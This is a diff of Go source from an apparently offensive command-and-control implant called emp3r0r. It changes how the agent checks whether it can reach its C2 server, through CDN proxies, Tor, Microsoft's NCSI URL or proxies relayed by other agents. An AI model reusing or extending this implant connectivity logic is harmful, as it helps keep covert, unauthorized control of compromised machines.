@@ -304,7 +304,7 @@ test_agent:
 			dns = agent.RuntimeConfig.DoHServer
 		}
 		go func() {
-			for !tun.IsProxyOK(cdnproxyAddr) {
+			for !tun.IsProxyOK(cdnproxyAddr, emp3r0r_data.CCAddress) {
 				// typically you need to configure AgentProxy manually if agent doesn't have internet
 				// and AgentProxy will be used for websocket connection, then replaced with 10888
 				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], agent.RuntimeConfig.CDNProxy, upper_proxy, dns)
@@ -345,7 +345,8 @@ test_agent:
 			}
 			return true
 
-		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy) {
+		} else if !tun.IsTor(emp3r0r_data.CCAddress) &&
+			!tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
 			if *cnt == 0 {
@@ -508,9 +509,9 @@ func isAgentAlive() bool {
 
 func isC2Reachable() bool {
 	if !agent.RuntimeConfig.DisableNCSI {
-		return tun.HasInternetAccess()
+		return tun.HasInternetAccess(tun.MicrosoftNCSIURL)
 	}
 
 	log.Println("NCSI is disabled, trying direct C2 connection")
-	return true
+	return tun.HasInternetAccess(emp3r0r_data.CCAddress)
 }
